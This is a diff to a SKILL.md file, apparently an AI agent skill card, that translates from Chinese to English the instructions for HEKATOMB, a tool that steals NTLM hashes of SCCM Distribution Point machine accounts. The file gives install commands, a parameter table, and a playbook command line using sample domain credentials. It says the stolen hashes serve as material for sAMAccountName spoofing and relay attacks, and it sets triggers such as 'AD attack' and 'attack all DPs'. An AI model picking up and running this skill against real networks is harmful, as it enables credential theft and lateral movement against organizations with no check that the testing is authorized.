@@ -2,38 +2,42 @@
 name: hekatomb-dp-secret
 description: "HEKATOMB steals SCCM DP machine account hashes. Signals: AD attack, domain pentest, auto find domain controller, attack all DPs, specify single DP."
 zh-signals: "HEKATOMB: SCCM DP 机器账户哈希窃取。信号:ad攻击,域渗透,自动找域控,打全部 DP,指定单个 DP。"
+when-to-use: >-
+  Use during SCCM or AD attacks when you have valid domain credentials and want
+  to harvest NTLM hashes of SCCM Distribution Point machine accounts for relay
+  or spoofing.
 ---
 
 # HEKATOMB
 
-- 攻击大类:C30 AD与横向移动
-- 上游仓库:https://github.com/ProcessusT/HEKATOMB
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C30 AD and Lateral Movement
+- Upstream Repository: https://github.com/ProcessusT/HEKATOMB
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/ProcessusT/HEKATOMB && cd HEKATOMB && pip install -r requirements.txt
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python3 hekatomb.py -u svc -p pass -d corp.local -dc-ip 10.0.0.1` | DP 共享机器账户 NTLM 哈希收割 |
-| `-dnscorp` | 自动找域控 |
-| `-all` | 打全部 DP |
-| `-k 10.0.0.5` | 指定单个 DP |
+| `python3 hekatomb.py -u svc -p pass -d corp.local -dc-ip 10.0.0.1` | Harvest DP shared machine account NTLM hashes |
+| `-dnscorp` | Auto-discover the domain controller |
+| `-all` | Hit all DPs |
+| `-k 10.0.0.5` | Target a single DP |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### SCCM DP 机器账户哈希窃取
+### SCCM DP machine account hash theft
 
 ```bash
 python3 hekatomb.py -u svc -p pass -d corp.local -dc-ip 10.0.0.1
-# 拿到 DP 机器账户 NTLM→可作为 sAMAccountName spoof 或 Relay 素材
+# Obtain the DP machine account NTLM hash → usable for sAMAccountName spoofing or relay material
 ```
 
-## 注意事项
+## Notes
 
-专攻 SCCM 分发点(DP)的机器账户 NTLM 哈希窃取,是 SCCM 攻击链的关键一环。
+Specializes in stealing NTLM hashes of SCCM Distribution Point (DP) machine accounts, a key link in the SCCM attack chain.
